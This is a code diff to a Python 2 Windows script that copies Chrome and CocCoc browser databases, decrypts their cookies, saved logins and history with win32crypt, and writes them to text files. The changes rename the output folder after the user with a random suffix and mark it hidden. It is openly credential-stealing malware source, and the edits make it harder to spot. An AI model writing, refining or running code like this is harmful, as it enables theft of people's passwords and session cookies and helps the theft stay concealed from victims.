@@ -1,13 +1,17 @@
 # encoding=utf8
-import os, sys
+import os, sys, random, string
 import sqlite3, shutil
 import win32crypt, win32api, win32file
 
+# randomise folder name
+folder = os.getenv('USERPROFILE').split('\\')[2] + '_' + ''.join([random.choice(string.digits) for _ in range(3)])
+
 def hiddenDir():
 	try:
-		win32file.SetFileAttributesW('.\secret', 0x02, None)
+		win32file.SetFileAttributesW('.\\' + folder, 0x02, None)
+		print '\n> hiddened folder'
 	except:
-		print "> Can't hidden folder"
+		print "\n> Can't hidden folder"
 
 def get_dbs():
 	# __init__
@@ -25,27 +29,30 @@ def get_dbs():
 		print '> Exit'
 		quit(0)
 
-	# copy file
-	try:
-		os.mkdir('.\secret')
+	# Create folder
+	try:		
+		os.mkdir('.\\'+folder)
+		print '> Created folder', folder
 	except:
-		pass
+		print '> folder existed'
+
+	# copy file	
 	if 'chrome' in dbs:
 		sys.stdout.write('> Chrome: ')
 		for file in steal_file:
 			sys.stdout.write('! ')
-			shutil.copy(dbs['chrome']+file, '.\secret\\' + file + '_chrome')
+			shutil.copy(dbs['chrome']+file, '.\\' + folder + '\\' + file + '_chrome')
 		sys.stdout.write(' OK, copied.\n')
 	if 'coccoc' in dbs:
 		sys.stdout.write('> CocCoc: ')
 		for file in steal_file:
 			sys.stdout.write('! ')
-			shutil.copy(dbs['coccoc']+file, '.\secret\\' + file + '_coccoc')
+			shutil.copy(dbs['coccoc']+file, '.\\' + folder + '\\' + file + '_coccoc')
 		sys.stdout.write(' OK, copied.\n')
 
 def connect2dbs():
 	# __init__
-	dbs = [i[2] for i in os.walk('.\secret')][0]
+	dbs = [i[2] for i in os.walk('.\\' + folder)][0]
 	cursor = dict()
 
 	# connect to databases
@@ -53,7 +60,7 @@ def connect2dbs():
 	for file in dbs:
 		try:
 			sys.stdout.write('! ')
-			conn= sqlite3.connect('.\secret\\' + file)
+			conn= sqlite3.connect('.\\' + folder + '\\' + file)
 		except:
 			sys.stdout.write('. ')
 		cursor[file] = sqlite3.Cursor(conn)
@@ -69,9 +76,9 @@ def connect2dbs():
 
 def decodeBlob(cursor):
 	# open new file
-	ckie_txt = open('.\secret\cookie.txt', 'wb')
-	login_txt = open('.\secret\login_data.txt', 'wb')
-	his_txt = open('.\secret\history.txt', 'wb')
+	ckie_txt = open('.\\' + folder + '\cookie.txt', 'wb')
+	login_txt = open('.\\' + folder + '\login_data.txt', 'wb')
+	his_txt = open('.\\' + folder + '\history.txt', 'wb')
 
 	# decrypt and write to file
 	sys.stdout.write('\n> Writing to file ')
@@ -98,10 +105,10 @@ def decodeBlob(cursor):
 	ckie_txt.close()
 	login_txt.close()
 	his_txt.close()	
-		
+	
 if __name__ == '__main__':
 	get_dbs()
 	decodeBlob(connect2dbs())
 	hiddenDir()
-	sys.stdout.write('\n> Done.\n')
+	sys.stdout.write('> Done.\n')
 	
